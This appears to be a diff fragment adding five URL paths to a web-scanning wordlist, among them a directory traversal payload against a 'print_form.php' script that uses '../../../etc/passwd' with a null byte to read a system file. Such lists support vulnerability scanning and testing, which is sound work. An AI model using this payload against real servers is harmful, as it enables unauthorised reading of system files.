@@ -1,0 +1,5 @@
+/contrib/acog/print_form.php?formname=../../../etc/passwd%00
+/index.html
+/#
+/web_caps/webCapsConfig
+/default.htm
